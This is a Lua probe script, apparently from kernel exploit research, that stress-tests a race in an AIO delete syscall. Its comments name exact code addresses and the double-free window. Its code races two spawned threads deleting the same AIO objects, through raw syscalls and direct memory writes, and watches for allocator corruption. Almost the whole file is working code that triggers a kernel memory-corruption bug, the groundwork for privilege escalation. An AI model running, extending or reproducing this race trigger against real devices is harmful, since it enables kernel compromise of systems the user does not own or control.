-- CRASH_CLASS: HIGH
-- PROBE 584a: stress the aio delete TOC-TOU for many rounds and watch for
-- allocator damage.
--
-- Context: the count-1 delete loads C=[W+0x18] at 0x8ad6feb7, frees C at
-- 0x8ad6fee8 and only then clears [W+0x18] at 0x8ad6fef5.  A second caller
-- that loads and tests C inside that window frees the same 0x30 chunk.
-- 523c/568a produced two zero statuses on 54-100 of 100 ids, but a caller
-- that finds C already null also returns 0, so the statuses alone cannot
-- say whether a second free happened.  This probe does not try to read the
-- statuses: it runs many rounds and reports the first round whose health
-- cycle (create / poll / delete twice) departs from 0 then 0x80020003.
-- If a chunk is ever freed twice, two aio objects will eventually share it
-- and one of these health cycles should break or the process should die.

print("=== PROBE 584a: AIO delete race stress ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return math.floor(v.h) * 4294967296 + math.floor(v.l) end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function U(a)
    a = to_num(a)
    local hi = math.floor(a / 4294967296)
    return uint64(string.format("0x%08X%08X", hi, a - hi * 4294967296))
end
local function hex8(v) return string.format("%08X", to_num(v) % 4294967296) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local Z = uint64(0)
local sc669, sc664, sc662, sc240 = make_syscall(669), make_syscall(664), make_syscall(662), make_syscall(240)

local IDS = to_num(memory.alloc(0x1000))
local ID1 = to_num(memory.alloc(0x40))
local OUT = to_num(memory.alloc(0x40))
local REQ = to_num(memory.alloc(0x40))
local RES = to_num(memory.alloc(0x400))
local ST  = to_num(memory.alloc(0x40))
local S0  = to_num(memory.alloc(0x400))
local S1  = to_num(memory.alloc(0x400))
local CTX = to_num(memory.alloc(0x40))
local TS  = to_num(memory.alloc(0x10))
for o = 0, 0x3F, 4 do wd(CTX + o, 0) end

-- request page: zero flags, count 1, mode 1, empty descriptor
local function make_one()
  wd(REQ, 0) wd(REQ + 4, 0) wd(REQ + 8, 0) wd(REQ + 0xC, 0)
  wd(OUT, 0)
  local ok, r = pcall(function() return sc669(U(1), U(REQ), U(1), U(1), U(OUT)) end)
  if not ok then return 999, 0 end
  return to_num(r), rd(OUT)
end
local function poll(id)
  wd(ID1, id) wd(ST, 0)
  pcall(function() sc664(U(ID1), U(1), U(ST), Z, Z, Z) end)
  return rd(ST)
end
local function del1(id, page)
  wd(ID1, id) wd(page, 0x77777777)
  local ok, r = pcall(function() return sc662(U(ID1), U(1), U(page), Z, Z, Z) end)
  return (ok and to_num(r) or 999), rd(page)
end

local N = 96
local ROUNDS = 6
local MODE = "disjoint"  -- overlap | disjoint | stagger (B sleeps DELAY_MS first)
local DELAY_MS = 200

-- two fresh helpers per round: a persistent loop dies inside the aio table
-- (the helper wall measured at 502), a one-shot thread does not.
local HELPER = [==[
local IDS, N, STATUS, CTX, DONE, DELAY, READY = !IDS!, !N!, !STATUS!, !CTX!, !DONE!, !DELAY!, !READY!
local function to_num(v)
  if type(v) == "table" and v.tonumber then return v:tonumber() end
  if type(v) == "table" and v.h then return math.floor(v.h) * 4294967296 + math.floor(v.l) end
  return tonumber(v) or 0
end
local function make_syscall(num)
  local t = {}
  for k, v in pairs(syscall.pipe) do t[k] = v end
  t.syscall_no = num
  setmetatable(t, getmetatable(syscall.pipe))
  return t
end
local function U(a)
  a = to_num(a)
  local hi = math.floor(a / 4294967296)
  return uint64(string.format("0x%08X%08X", hi, a - hi * 4294967296))
end
local f = make_syscall(662)
pcall(function() memory.write_dword(CTX + READY, 1) end)
local spins = 0
while to_num(memory.read_dword(CTX + 16)) == 0 and spins < 20000000 do spins = spins + 1 end
if DELAY > 0 then
  local slp = make_syscall(240)
  local ts = to_num(memory.alloc(0x10))
  pcall(function()
    memory.write_qword(ts, math.floor(DELAY / 1000))
    memory.write_qword(ts + 8, (DELAY % 1000) * 1000000)
    slp(U(ts), uint64(0))
  end)
end
pcall(function() return f(U(IDS), U(N), U(STATUS), uint64(0), uint64(0), uint64(0)) end)
pcall(function() memory.write_dword(CTX + DONE, 1) end)
]==]
local function build(status, done, idbase, n, delay, ready)
  local b = HELPER
  b = b:gsub("!DELAY!", tostring(delay or 0))
  b = b:gsub("!READY!", tostring(ready))
  b = b:gsub("!IDS!", tostring(idbase))
  b = b:gsub("!N!", tostring(n))
  b = b:gsub("!STATUS!", tostring(status))
  b = b:gsub("!CTX!", tostring(CTX))
  b = b:gsub("!DONE!", tostring(done))
  return b
end
local function spawn(status, done, idbase, n, delay, ready)
  local ok = false
  pcall(function() ok = run_lua_code_in_new_thread(build(status, done, idbase, n, delay, ready), { async = true }) end)
  return ok
end

local anomalies, created_bad, dead = 0, 0, false
for round = 1, ROUNDS do
  local made = 0
  for o = 0, N * 4 - 1, 4 do wd(S0 + o, 0x77777777) wd(S1 + o, 0x77777777) end
  for i = 0, N - 1 do
    local r, id = make_one()
    if r == 0 and id > 0 then
      wd(IDS + i * 4, id)
      if poll(id) ~= 3 then created_bad = created_bad + 1 end
      made = made + 1
    else
      created_bad = created_bad + 1
    end
    if (i + 1) % 32 == 0 then
      print(string.format("[C] round %d created %d", round, i + 1))
    end
  end
  if made < N then
    print(string.format("[R] round %d only %d/64 objects", round, made))
  end
  print(string.format("[C] round %d ready made=%d", round, made))
  wd(CTX + 4, 0) wd(CTX + 8, 0)
  local base0, n0, base1, n1 = IDS, N, IDS, N
  local d0, d1 = 0, 0
  if MODE == "disjoint" then
    base0, n0, base1, n1 = IDS, math.floor(N / 2), IDS + math.floor(N / 2) * 4, N - math.floor(N / 2)
  elseif MODE == "stagger" then
    d1 = DELAY_MS
  end
  wd(CTX + 0x10, 0) wd(CTX + 0x14, 0) wd(CTX + 0x18, 0)
  local sp0 = spawn(S0, 4, base0, n0, d0, 0x14)
  local sp1 = spawn(S1, 8, base1, n1, d1, 0x18)
  local rdy = 0
  while (rd(CTX + 0x14) == 0 or rd(CTX + 0x18) == 0) and rdy < 40000000 do rdy = rdy + 1 end
  wd(CTX + 0x10, 1)
  print(string.format("[H] %s round %d ready=%d/%d n=%d/%d", MODE, round, rd(CTX + 0x14), rd(CTX + 0x18), n0, n1))
  local TS2 = TS
  local waited = 0
  while (rd(CTX + 4) == 0 or rd(CTX + 8) == 0) and waited < 4000 do
    waited = waited + 1
    if waited % 50 == 1 then
      pcall(function() memory.write_qword(TS2, 0) memory.write_qword(TS2 + 8, 200000) sc240(U(TS2), Z) end)
    end
  end
  local two = 0
  for i = 0, N - 1 do
    if rd(S0 + i * 4) == 0 and rd(S1 + i * 4) == 0 then two = two + 1 end
  end
  if rd(CTX + 4) == 0 or rd(CTX + 8) == 0 then
    print(string.format("[R] round %d helpers stalled spawn=%s/%s done=%d/%d", round,
      tostring(sp0), tostring(sp1), rd(CTX + 4), rd(CTX + 8)))
    dead = true
    break
  end
  -- health: a fresh object must still behave
  local r, id = make_one()
  if r ~= 0 or id == 0 then
    anomalies = anomalies + 1
    print(string.format("[R] round %d health create ret=%d id=%s", round, r, hex8(id)))
  else
    local st = poll(id)
    local d1, s1 = del1(id, RES)
    local d2, s2 = del1(id, RES)
    if st ~= 3 or d1 ~= 0 or s1 ~= 0 or d2 ~= 0 or s2 ~= 0x80020003 then
      anomalies = anomalies + 1
      print(string.format("[R] round %d health id=%s st=%s d1=%d/%s d2=%d/%s",
        round, hex8(id), hex8(st), d1, hex8(s1), d2, hex8(s2)))
    end
  end
  print(string.format("[R] %d two-zero=%d anomalies=%d bad=%d health=%s", round, two, anomalies, created_bad, hex8(rd(S0))))
end
wd(CTX + 0x20, 1)
local alive = pcall(function() return make_syscall(20)() end)
print(string.format("[E] rounds=%d anomalies=%d bad_creates=%d alive=%s", ROUNDS, anomalies, created_bad, tostring(alive)))
